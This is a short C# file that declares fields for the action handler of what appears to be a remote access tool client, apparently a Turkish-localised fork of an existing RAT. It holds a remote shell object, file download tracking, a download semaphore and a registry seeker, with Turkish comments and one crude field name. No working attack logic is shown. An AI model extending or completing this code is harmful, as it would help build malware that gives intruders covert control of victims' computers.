using System.Collections.Generic;
using System.Threading;
using xClient.KuuhakuÇekirdek.KayıtDefteri;
using xClient.KuuhakuÇekirdek.Utilityler;

namespace xClient.KuuhakuÇekirdek.Eylemler
{
    // Çalışırsa 2 sözlüğü readonly yap //
    public static partial class Eylemİşleyicisi
    {
        public static UnsafeStreamCodec StreamCodec;
        private static Shell _shell;
        private static Dictionary<int, string> _renamedFiles = new Dictionary<int, string>();
        private static Dictionary<int, string> _canceledDownloads = new Dictionary<int, string>();
        private const string Antilimiter = "$E$";
        private static readonly Semaphore LimitThreads = new Semaphore(2, 2); // Eşzamanlı aynı andaki dosya indirme
        public static RegistrySeeker Sikerxd;
    }
}